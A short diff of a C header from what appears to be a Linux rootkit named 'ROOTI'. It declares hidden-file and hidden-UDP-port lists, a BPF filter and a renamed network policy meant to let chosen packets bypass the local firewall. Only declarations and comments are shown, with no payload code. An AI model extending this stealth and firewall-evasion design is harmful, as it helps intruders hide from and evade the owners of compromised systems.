@@ -3,7 +3,7 @@
 
 #include <linux/types.h> 
 #include <linux/filter.h>
-#include "capabilities/fw_bypass.h"
+#include "policy.h"
 
 // Names of files that should be hidden
 extern const char *ROOTI_HIDDEN_FILES[];
@@ -34,9 +34,9 @@ extern const size_t ROOTI_HIDDEN_UDP_PORTS_COUNT;
 extern struct sock_filter ROOTI_BPF_FILTER_PROGRAM[];
 extern const size_t ROOTI_BPF_FILTER_PROGRAM_COUNT;
 
-// Set of network rules to enforce. These rules will apply regardless
-// of a any local firewall. Unspecified fields get treated as "match all values".
-extern const struct rooti_net_policy ROOTI_NET_POLICY;
+// Set of network rules that define which packets should bypass the local firewall.
+// These rules will apply regardless of any other netfilter hooks installed.
+extern const struct rooti_net_policy ROOTI_FW_POLICY;
 
 /* 
  * Recursion loops protection mechanism - often times hooked functions call 
